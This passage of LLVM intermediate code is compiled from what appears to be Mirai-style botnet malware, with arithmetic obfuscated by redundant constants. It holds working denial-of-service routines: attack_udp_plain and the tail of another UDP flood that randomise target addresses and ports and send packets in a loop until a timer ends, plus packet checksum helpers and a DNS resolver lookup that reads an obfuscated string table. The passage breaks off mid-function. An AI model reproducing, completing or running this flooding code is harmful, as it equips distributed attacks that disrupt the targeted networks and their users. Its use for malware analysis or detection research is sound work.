  %473 = add i64 %472, 4
  %474 = sub i64 %473, 2115762326117657995
  %475 = add i64 %470, 4
  %476 = trunc i64 %474 to i32
  %477 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %451, i8* %453, i16 zeroext %456, i32 %476)
  %478 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %479 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %478, i32 0, i32 3
  store i16 %477, i16* %479, align 2
  %480 = load i32, i32* %24, align 4
  %481 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %482 = load i32, i32* %11, align 4
  %483 = sext i32 %482 to i64
  %484 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %481, i64 %483
  %485 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %484, i32 0, i32 0
  %486 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %485, i32 0, i32 2
  %487 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %486, i32 0, i32 0
  store i32 %480, i32* %487, align 4
  %488 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %489 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %488, i32 0, i32 1
  %490 = load i16, i16* %489, align 2
  %491 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %492 = load i32, i32* %11, align 4
  %493 = sext i32 %492 to i64
  %494 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %491, i64 %493
  %495 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %494, i32 0, i32 0
  %496 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %495, i32 0, i32 1
  store i16 %490, i16* %496, align 2
  %497 = load i32, i32* %12, align 4
  %498 = load i8*, i8** %35, align 8
  %499 = load i8, i8* %21, align 1
  %500 = zext i8 %499 to i64
  %501 = sub i64 0, %500
  %502 = sub i64 41, %501
  %503 = add i64 41, %500
  %504 = sub i64 %502, 5213491003581455639
  %505 = add i64 %504, 2
  %506 = add i64 %505, 5213491003581455639
  %507 = add i64 %502, 2
  %508 = load i32, i32* %23, align 4
  %509 = sext i32 %508 to i64
  %510 = add i64 %506, 6107883993032793845
  %511 = add i64 %510, %509
  %512 = sub i64 %511, 6107883993032793845
  %513 = add i64 %506, %509
  %514 = sub i64 0, 4
  %515 = sub i64 %512, %514
  %516 = add i64 %512, 4
  %517 = bitcast %union.__CONST_SOCKADDR_ARG* %40 to %struct.sockaddr**
  %518 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %519 = load i32, i32* %11, align 4
  %520 = sext i32 %519 to i64
  %521 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %518, i64 %520
  %522 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %521, i32 0, i32 0
  %523 = bitcast %struct.sockaddr_in* %522 to %struct.sockaddr*
  store %struct.sockaddr* %523, %struct.sockaddr** %517, align 8
  %524 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %40, i32 0, i32 0
  %525 = load %struct.sockaddr*, %struct.sockaddr** %524, align 8
  %526 = call i64 @sendto(i32 %497, i8* %498, i64 %515, i32 16384, %struct.sockaddr* %525, i32 16)
  br label %527

; <label>:527:                                    ; preds = %434
  %528 = load i32, i32* %11, align 4
  %529 = sub i32 %528, -1510743858
  %530 = add i32 %529, 1
  %531 = add i32 %530, -1510743858
  %532 = add nsw i32 %528, 1
  store i32 %531, i32* %11, align 4
  br label %356

; <label>:533:                                    ; preds = %356
  %534 = call i64 @time(i64* null) #6
  %535 = load i32, i32* %25, align 4
  %536 = sext i32 %535 to i64
  %537 = icmp sgt i64 %534, %536
  br i1 %537, label %538, label %539

; <label>:538:                                    ; preds = %533
  br label %540

; <label>:539:                                    ; preds = %533
  br label %355

; <label>:540:                                    ; preds = %538, %103, %97, %91
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @get_dns_resolver() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca [2048 x i8], align 16
  %6 = alloca i32, align 4
  %7 = alloca [32 x i8], align 16
  %8 = alloca i8, align 1
  %9 = alloca i8, align 1
  %10 = alloca i8, align 1
  store i32 0, i32* %2, align 4
  call void @table_unlock_val(i8 zeroext 37)
  %11 = call i8* @table_retrieve_val(i32 37, i32* null)
  %12 = call i32 (i8*, i32, ...) @open(i8* %11, i32 0)
  store i32 %12, i32* %2, align 4
  call void @table_lock_val(i8 zeroext 37)
  %13 = load i32, i32* %2, align 4
  %14 = icmp sge i32 %13, 0
  br i1 %14, label %15, label %106

; <label>:15:                                     ; preds = %0
  store i32 0, i32* %3, align 4
  store i32 0, i32* %4, align 4
  %16 = load i32, i32* %2, align 4
  %17 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %18 = call i64 @read(i32 %16, i8* %17, i64 2048)
  %19 = trunc i64 %18 to i32
  store i32 %19, i32* %3, align 4
  %20 = load i32, i32* %2, align 4
  %21 = call i32 @close(i32 %20)
  call void @table_unlock_val(i8 zeroext 38)
  %22 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %23 = load i32, i32* %3, align 4
  %24 = call i8* @table_retrieve_val(i32 38, i32* null)
  %25 = call i32 @util_stristr(i8* %22, i32 %23, i8* %24)
  store i32 %25, i32* %4, align 4
  call void @table_lock_val(i8 zeroext 38)
  %26 = load i32, i32* %4, align 4
  %27 = icmp ne i32 %26, -1
  br i1 %27, label %28, label %105

; <label>:28:                                     ; preds = %15
  store i32 0, i32* %6, align 4
  store i8 0, i8* %8, align 1
  store i8 0, i8* %9, align 1
  %29 = load i32, i32* %4, align 4
  store i32 %29, i32* %6, align 4
  br label %30

; <label>:30:                                     ; preds = %93, %28
  %31 = load i32, i32* %6, align 4
  %32 = load i32, i32* %3, align 4
  %33 = icmp slt i32 %31, %32
  br i1 %33, label %34, label %98

; <label>:34:                                     ; preds = %30
  %35 = load i32, i32* %6, align 4
  %36 = sext i32 %35 to i64
  %37 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i64 0, i64 %36
  %38 = load i8, i8* %37, align 1
  store i8 %38, i8* %10, align 1
  %39 = load i8, i8* %8, align 1
  %40 = icmp ne i8 %39, 0
  br i1 %40, label %52, label %41

; <label>:41:                                     ; preds = %34
  %42 = load i8, i8* %10, align 1
  %43 = sext i8 %42 to i32
  %44 = icmp eq i32 %43, 32
  br i1 %44, label %49, label %45

; <label>:45:                                     ; preds = %41
  %46 = load i8, i8* %10, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 9
  br i1 %48, label %49, label %50

; <label>:49:                                     ; preds = %45, %41
  br label %93

; <label>:50:                                     ; preds = %45
  store i8 1, i8* %8, align 1
  br label %51

; <label>:51:                                     ; preds = %50
  br label %52

; <label>:52:                                     ; preds = %51, %34
  %53 = load i8, i8* %10, align 1
  %54 = sext i8 %53 to i32
  %55 = icmp ne i32 %54, 46
  br i1 %55, label %56, label %64

; <label>:56:                                     ; preds = %52
  %57 = load i8, i8* %10, align 1
  %58 = sext i8 %57 to i32
  %59 = icmp slt i32 %58, 48
  br i1 %59, label %72, label %60

; <label>:60:                                     ; preds = %56
  %61 = load i8, i8* %10, align 1
  %62 = sext i8 %61 to i32
  %63 = icmp sgt i32 %62, 57
  br i1 %63, label %72, label %64

; <label>:64:                                     ; preds = %60, %52
  %65 = load i32, i32* %6, align 4
  %66 = load i32, i32* %3, align 4
  %67 = sub i32 %66, -466219426
  %68 = sub i32 %67, 1
  %69 = add i32 %68, -466219426
  %70 = sub nsw i32 %66, 1
  %71 = icmp eq i32 %65, %69
  br i1 %71, label %72, label %92

; <label>:72:                                     ; preds = %64, %60, %56
  %73 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %74 = getelementptr inbounds [2048 x i8], [2048 x i8]* %5, i32 0, i32 0
  %75 = load i32, i32* %4, align 4
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds i8, i8* %74, i64 %76
  %78 = load i32, i32* %6, align 4
  %79 = load i32, i32* %4, align 4
  %80 = add i32 %78, -1299013938
  %81 = sub i32 %80, %79
  %82 = sub i32 %81, -1299013938
  %83 = sub nsw i32 %78, %79
  call void @util_memcpy(i8* %73, i8* %77, i32 %82)
  %84 = load i32, i32* %6, align 4
  %85 = load i32, i32* %4, align 4
  %86 = sub i32 %84, 1914369095
  %87 = sub i32 %86, %85
  %88 = add i32 %87, 1914369095
  %89 = sub nsw i32 %84, %85
  %90 = sext i32 %88 to i64
  %91 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i64 0, i64 %90
  store i8 0, i8* %91, align 1
  store i8 1, i8* %9, align 1
  br label %98

; <label>:92:                                     ; preds = %64
  br label %93

; <label>:93:                                     ; preds = %92, %49
  %94 = load i32, i32* %6, align 4
  %95 = sub i32 0, 1
  %96 = sub i32 %94, %95
  %97 = add nsw i32 %94, 1
  store i32 %96, i32* %6, align 4
  br label %30

; <label>:98:                                     ; preds = %72, %30
  %99 = load i8, i8* %9, align 1
  %100 = icmp ne i8 %99, 0
  br i1 %100, label %101, label %104

; <label>:101:                                    ; preds = %98
  %102 = getelementptr inbounds [32 x i8], [32 x i8]* %7, i32 0, i32 0
  %103 = call i32 @inet_addr(i8* %102) #6
  store i32 %103, i32* %1, align 4
  br label %117

; <label>:104:                                    ; preds = %98
  br label %105

; <label>:105:                                    ; preds = %104, %15
  br label %106

; <label>:106:                                    ; preds = %105, %0
  %107 = call i32 @rand_next()
  %108 = urem i32 %107, 4
  switch i32 %108, label %117 [
    i32 0, label %109
    i32 1, label %111
    i32 2, label %113
    i32 3, label %115
  ]

; <label>:109:                                    ; preds = %106
  %110 = call i32 @htonl(i32 134744072) #7
  store i32 %110, i32* %1, align 4
  br label %117

; <label>:111:                                    ; preds = %106
  %112 = call i32 @htonl(i32 1246898730) #7
  store i32 %112, i32* %1, align 4
  br label %117

; <label>:113:                                    ; preds = %106
  %114 = call i32 @htonl(i32 1074151430) #7
  store i32 %114, i32* %1, align 4
  br label %117

; <label>:115:                                    ; preds = %106
  %116 = call i32 @htonl(i32 67240450) #7
  store i32 %116, i32* %1, align 4
  br label %117

; <label>:117:                                    ; preds = %115, %113, %111, %109, %106, %101
  %118 = load i32, i32* %1, align 4
  ret i32 %118
}

declare i32 @open(i8*, i32, ...) #3

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_plain(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i8**, align 8
  %13 = alloca i32*, align 8
  %14 = alloca i16, align 2
  %15 = alloca i16, align 2
  %16 = alloca i16, align 2
  %17 = alloca i8, align 1
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca i32, align 4
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %24 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  %25 = alloca i8*, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  %26 = load i8, i8* %7, align 1
  %27 = zext i8 %26 to i64
  %28 = call noalias i8* @calloc(i64 %27, i64 8) #6
  %29 = bitcast i8* %28 to i8**
  store i8** %29, i8*** %12, align 8
  %30 = load i8, i8* %7, align 1
  %31 = zext i8 %30 to i64
  %32 = call noalias i8* @calloc(i64 %31, i64 4) #6
  %33 = bitcast i8* %32 to i32*
  store i32* %33, i32** %13, align 8
  %34 = load i8, i8* %9, align 1
  %35 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %36 = call i32 @attack_get_opt_int(i8 zeroext %34, %struct.attack_option* %35, i8 zeroext 7, i32 65535)
  %37 = trunc i32 %36 to i16
  store i16 %37, i16* %14, align 2
  %38 = load i8, i8* %9, align 1
  %39 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %40 = call i32 @attack_get_opt_int(i8 zeroext %38, %struct.attack_option* %39, i8 zeroext 6, i32 65535)
  %41 = trunc i32 %40 to i16
  store i16 %41, i16* %15, align 2
  %42 = load i8, i8* %9, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 0, i32 512)
  %45 = trunc i32 %44 to i16
  store i16 %45, i16* %16, align 2
  %46 = load i8, i8* %9, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 1, i32 1)
  %49 = trunc i32 %48 to i8
  store i8 %49, i8* %17, align 1
  %50 = bitcast %struct.sockaddr_in* %18 to i8*
  call void @llvm.memset.p0i8.i64(i8* %50, i8 0, i64 16, i32 4, i1 false)
  %51 = call i64 @time(i64* null) #6
  %52 = load i32, i32* %6, align 4
  %53 = sext i32 %52 to i64
  %54 = sub i64 0, %53
  %55 = sub i64 %51, %54
  %56 = add nsw i64 %51, %53
  %57 = trunc i64 %55 to i32
  store i32 %57, i32* %19, align 4
  %58 = load i16, i16* %15, align 2
  %59 = zext i16 %58 to i32
  %60 = icmp eq i32 %59, 65535
  br i1 %60, label %61, label %64

; <label>:61:                                     ; preds = %5
  %62 = call i32 @rand_next()
  %63 = trunc i32 %62 to i16
  store i16 %63, i16* %15, align 2
  br label %67

; <label>:64:                                     ; preds = %5
  %65 = load i16, i16* %15, align 2
  %66 = call zeroext i16 @htons(i16 zeroext %65) #7
  store i16 %66, i16* %15, align 2
  br label %67

; <label>:67:                                     ; preds = %64, %61
  store i32 0, i32* %11, align 4
  br label %68

; <label>:68:                                     ; preds = %183, %67
  %69 = load i32, i32* %11, align 4
  %70 = load i8, i8* %7, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp slt i32 %69, %71
  br i1 %72, label %73, label %188

; <label>:73:                                     ; preds = %68
  %74 = call noalias i8* @calloc(i64 65535, i64 1) #6
  %75 = load i8**, i8*** %12, align 8
  %76 = load i32, i32* %11, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8*, i8** %75, i64 %77
  store i8* %74, i8** %78, align 8
  %79 = load i16, i16* %14, align 2
  %80 = zext i16 %79 to i32
  %81 = icmp eq i32 %80, 65535
  br i1 %81, label %82, label %91

; <label>:82:                                     ; preds = %73
  %83 = call i32 @rand_next()
  %84 = trunc i32 %83 to i16
  %85 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %86 = load i32, i32* %11, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %85, i64 %87
  %89 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %88, i32 0, i32 0
  %90 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %89, i32 0, i32 1
  store i16 %84, i16* %90, align 2
  br label %100

; <label>:91:                                     ; preds = %73
  %92 = load i16, i16* %14, align 2
  %93 = call zeroext i16 @htons(i16 zeroext %92) #7
  %94 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %95 = load i32, i32* %11, align 4
  %96 = sext i32 %95 to i64
  %97 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %94, i64 %96
  %98 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %97, i32 0, i32 0
  %99 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %98, i32 0, i32 1
  store i16 %93, i16* %99, align 2
  br label %100

; <label>:100:                                    ; preds = %91, %82
  %101 = call i32 @socket(i32 2, i32 2, i32 17) #6
  %102 = load i32*, i32** %13, align 8
  %103 = load i32, i32* %11, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds i32, i32* %102, i64 %104
  store i32 %101, i32* %105, align 4
  %106 = icmp eq i32 %101, -1
  br i1 %106, label %107, label %108

; <label>:107:                                    ; preds = %100
  br label %234

; <label>:108:                                    ; preds = %100
  %109 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %109, align 4
  %110 = load i16, i16* %15, align 2
  %111 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %110, i16* %111, align 2
  %112 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %113 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %112, i32 0, i32 0
  store i32 0, i32* %113, align 4
  %114 = load i32*, i32** %13, align 8
  %115 = load i32, i32* %11, align 4
  %116 = sext i32 %115 to i64
  %117 = getelementptr inbounds i32, i32* %114, i64 %116
  %118 = load i32, i32* %117, align 4
  %119 = bitcast %union.__CONST_SOCKADDR_ARG* %23 to %struct.sockaddr**
  %120 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  store %struct.sockaddr* %120, %struct.sockaddr** %119, align 8
  %121 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %23, i32 0, i32 0
  %122 = load %struct.sockaddr*, %struct.sockaddr** %121, align 8
  %123 = call i32 @bind(i32 %118, %struct.sockaddr* %122, i32 16) #6
  %124 = icmp eq i32 %123, -1
  br i1 %124, label %125, label %126

; <label>:125:                                    ; preds = %108
  br label %126

; <label>:126:                                    ; preds = %125, %108
  %127 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %128 = load i32, i32* %11, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %127, i64 %129
  %131 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %130, i32 0, i32 2
  %132 = load i8, i8* %131, align 4
  %133 = zext i8 %132 to i32
  %134 = icmp slt i32 %133, 32
  br i1 %134, label %135, label %164

; <label>:135:                                    ; preds = %126
  %136 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %137 = load i32, i32* %11, align 4
  %138 = sext i32 %137 to i64
  %139 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %136, i64 %138
  %140 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %139, i32 0, i32 1
  %141 = load i32, i32* %140, align 4
  %142 = call i32 @ntohl(i32 %141) #7
  %143 = call i32 @rand_next()
  %144 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %145 = load i32, i32* %11, align 4
  %146 = sext i32 %145 to i64
  %147 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %144, i64 %146
  %148 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %147, i32 0, i32 2
  %149 = load i8, i8* %148, align 4
  %150 = zext i8 %149 to i32
  %151 = lshr i32 %143, %150
  %152 = add i32 %142, -1391345715
  %153 = add i32 %152, %151
  %154 = sub i32 %153, -1391345715
  %155 = add i32 %142, %151
  %156 = call i32 @htonl(i32 %154) #7
  %157 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %158 = load i32, i32* %11, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %157, i64 %159
  %161 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %160, i32 0, i32 0
  %162 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %161, i32 0, i32 2
  %163 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %162, i32 0, i32 0
  store i32 %156, i32* %163, align 4
  br label %164

; <label>:164:                                    ; preds = %135, %126
  %165 = load i32*, i32** %13, align 8
  %166 = load i32, i32* %11, align 4
  %167 = sext i32 %166 to i64
  %168 = getelementptr inbounds i32, i32* %165, i64 %167
  %169 = load i32, i32* %168, align 4
  %170 = bitcast %union.__CONST_SOCKADDR_ARG* %24 to %struct.sockaddr**
  %171 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %172 = load i32, i32* %11, align 4
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %171, i64 %173
  %175 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %174, i32 0, i32 0
  %176 = bitcast %struct.sockaddr_in* %175 to %struct.sockaddr*
  store %struct.sockaddr* %176, %struct.sockaddr** %170, align 8
  %177 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %24, i32 0, i32 0
  %178 = load %struct.sockaddr*, %struct.sockaddr** %177, align 8
  %179 = call i32 @connect(i32 %169, %struct.sockaddr* %178, i32 16)
  %180 = icmp eq i32 %179, -1
  br i1 %180, label %181, label %182

; <label>:181:                                    ; preds = %164
  br label %182

; <label>:182:                                    ; preds = %181, %164
  br label %183

; <label>:183:                                    ; preds = %182
  %184 = load i32, i32* %11, align 4
  %185 = sub i32 0, 1
  %186 = sub i32 %184, %185
  %187 = add nsw i32 %184, 1
  store i32 %186, i32* %11, align 4
  br label %68

; <label>:188:                                    ; preds = %68
  br label %189

; <label>:189:                                    ; preds = %233, %188
  store i32 0, i32* %11, align 4
  br label %190

; <label>:190:                                    ; preds = %221, %189
  %191 = load i32, i32* %11, align 4
  %192 = load i8, i8* %7, align 1
  %193 = zext i8 %192 to i32
  %194 = icmp slt i32 %191, %193
  br i1 %194, label %195, label %227

; <label>:195:                                    ; preds = %190
  %196 = load i8**, i8*** %12, align 8
  %197 = load i32, i32* %11, align 4
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds i8*, i8** %196, i64 %198
  %200 = load i8*, i8** %199, align 8
  store i8* %200, i8** %25, align 8
  %201 = load i8, i8* %17, align 1
  %202 = icmp ne i8 %201, 0
  br i1 %202, label %203, label %211

; <label>:203:                                    ; preds = %195
  %204 = load i8*, i8** %25, align 8
  %205 = load i16, i16* %16, align 2
  %206 = zext i16 %205 to i32
  call void @rand_alphastr(i8* %204, i32 %206)
  %207 = load i8*, i8** %25, align 8
  %208 = load i16, i16* %16, align 2
  %209 = zext i16 %208 to i64
  %210 = getelementptr inbounds i8, i8* %207, i64 %209
  store i8 0, i8* %210, align 1
  br label %211

; <label>:211:                                    ; preds = %203, %195
  %212 = load i32*, i32** %13, align 8
  %213 = load i32, i32* %11, align 4
  %214 = sext i32 %213 to i64
  %215 = getelementptr inbounds i32, i32* %212, i64 %214
  %216 = load i32, i32* %215, align 4
  %217 = load i8*, i8** %25, align 8
  %218 = load i16, i16* %16, align 2
  %219 = zext i16 %218 to i64
  %220 = call i64 @send(i32 %216, i8* %217, i64 %219, i32 16384)
  br label %221

; <label>:221:                                    ; preds = %211
  %222 = load i32, i32* %11, align 4
  %223 = sub i32 %222, 563979081
  %224 = add i32 %223, 1
  %225 = add i32 %224, 563979081
  %226 = add nsw i32 %222, 1
  store i32 %225, i32* %11, align 4
  br label %190

; <label>:227:                                    ; preds = %190
  %228 = call i64 @time(i64* null) #6
  %229 = load i32, i32* %19, align 4
  %230 = sext i32 %229 to i64
  %231 = icmp sgt i64 %228, %230
  br i1 %231, label %232, label %233

; <label>:232:                                    ; preds = %227
  br label %234

; <label>:233:                                    ; preds = %227
  br label %189

; <label>:234:                                    ; preds = %232, %107
  ret void
}

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_generic(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %19, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp ugt i32 %7, 1
  br i1 %8, label %9, label %24

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = sub i64 %14, -7847463078959838028
  %16 = add i64 %15, %13
  %17 = add i64 %16, -7847463078959838028
  %18 = add i64 %14, %13
  store i64 %17, i64* %5, align 8
  br label %19

; <label>:19:                                     ; preds = %9
  %20 = load i32, i32* %4, align 4
  %21 = sub i32 0, 2
  %22 = add i32 %20, %21
  %23 = sub i32 %20, 2
  store i32 %22, i32* %4, align 4
  br label %6

; <label>:24:                                     ; preds = %6
  %25 = load i32, i32* %4, align 4
  %26 = icmp eq i32 %25, 1
  br i1 %26, label %27, label %36

; <label>:27:                                     ; preds = %24
  %28 = load i16*, i16** %3, align 8
  %29 = load i16, i16* %28, align 2
  %30 = trunc i16 %29 to i8
  %31 = sext i8 %30 to i64
  %32 = load i64, i64* %5, align 8
  %33 = sub i64 0, %31
  %34 = sub i64 %32, %33
  %35 = add i64 %32, %31
  store i64 %34, i64* %5, align 8
  br label %36

; <label>:36:                                     ; preds = %27, %24
  %37 = load i64, i64* %5, align 8
  %38 = lshr i64 %37, 16
  %39 = load i64, i64* %5, align 8
  %40 = xor i64 %39, -1
  %41 = xor i64 65535, -1
  %42 = xor i64 -5959200615366552415, -1
  %43 = or i64 %40, %41
  %44 = or i64 -5959200615366552415, %42
  %45 = xor i64 %43, -1
  %46 = and i64 %45, %44
  %47 = and i64 %39, 65535
  %48 = sub i64 0, %38
  %49 = sub i64 0, %46
  %50 = add i64 %48, %49
  %51 = sub i64 0, %50
  %52 = add i64 %38, %46
  store i64 %51, i64* %5, align 8
  %53 = load i64, i64* %5, align 8
  %54 = lshr i64 %53, 16
  %55 = load i64, i64* %5, align 8
  %56 = sub i64 %55, 4301609978875622574
  %57 = add i64 %56, %54
  %58 = add i64 %57, 4301609978875622574
  %59 = add i64 %55, %54
  store i64 %58, i64* %5, align 8
  %60 = load i64, i64* %5, align 8
  %61 = xor i64 %60, -1
  %62 = and i64 -1, %61
  %63 = xor i64 -1, -1
  %64 = and i64 %60, %63
  %65 = or i64 %62, %64
  %66 = xor i64 %60, -1
  %67 = trunc i64 %65 to i16
  ret i16 %67
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #0 {
  %5 = alloca %struct.iphdr*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i16*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %5, align 8
  store i8* %1, i8** %6, align 8
  store i16 %2, i16* %7, align 2
  store i32 %3, i32* %8, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = bitcast i8* %14 to i16*
  store i16* %15, i16** %9, align 8
  %16 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %16, i32 0, i32 8
  %18 = load i32, i32* %17, align 4
  store i32 %18, i32* %10, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %20 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %19, i32 0, i32 9
  %21 = load i32, i32* %20, align 4
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %22 = load i32, i32* %8, align 4
  store i32 %22, i32* %13, align 4
  br label %23

; <label>:23:                                     ; preds = %26, %4
  %24 = load i32, i32* %8, align 4
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %26, label %42

; <label>:26:                                     ; preds = %23
  %27 = load i16*, i16** %9, align 8
  %28 = load i16, i16* %27, align 2
  %29 = zext i16 %28 to i32
  %30 = load i32, i32* %12, align 4
  %31 = sub i32 %30, 1510900986
  %32 = add i32 %31, %29
  %33 = add i32 %32, 1510900986
  %34 = add i32 %30, %29
  store i32 %33, i32* %12, align 4
  %35 = load i16*, i16** %9, align 8
  %36 = getelementptr inbounds i16, i16* %35, i32 1
  store i16* %36, i16** %9, align 8
  %37 = load i32, i32* %8, align 4
  %38 = add i32 %37, 1410542874
  %39 = sub i32 %38, 2
  %40 = sub i32 %39, 1410542874
  %41 = sub nsw i32 %37, 2
  store i32 %40, i32* %8, align 4
  br label %23

; <label>:42:                                     ; preds = %23
  %43 = load i32, i32* %8, align 4
  %44 = icmp eq i32 %43, 1
  br i1 %44, label %45, label %54

; <label>:45:                                     ; preds = %42
  %46 = load i16*, i16** %9, align 8
  %47 = bitcast i16* %46 to i8*
  %48 = load i8, i8* %47, align 1
  %49 = zext i8 %48 to i32
  %50 = load i32, i32* %12, align 4
  %51 = sub i32 0, %49
  %52 = sub i32 %50, %51
  %53 = add i32 %50, %49
  store i32 %52, i32* %12, align 4
  br label %54

; <label>:54:                                     ; preds = %45, %42
  %55 = load i32, i32* %10, align 4
  %56 = lshr i32 %55, 16
  %57 = xor i32 65535, -1
  %58 = xor i32 %56, %57
  %59 = and i32 %58, %56
  %60 = and i32 %56, 65535
  %61 = load i32, i32* %12, align 4
  %62 = sub i32 %61, -450971470
  %63 = add i32 %62, %59
  %64 = add i32 %63, -450971470
  %65 = add i32 %61, %59
  store i32 %64, i32* %12, align 4
  %66 = load i32, i32* %10, align 4
  %67 = xor i32 %66, -1
  %68 = xor i32 65535, -1
  %69 = xor i32 189930124, -1
  %70 = or i32 %67, %68
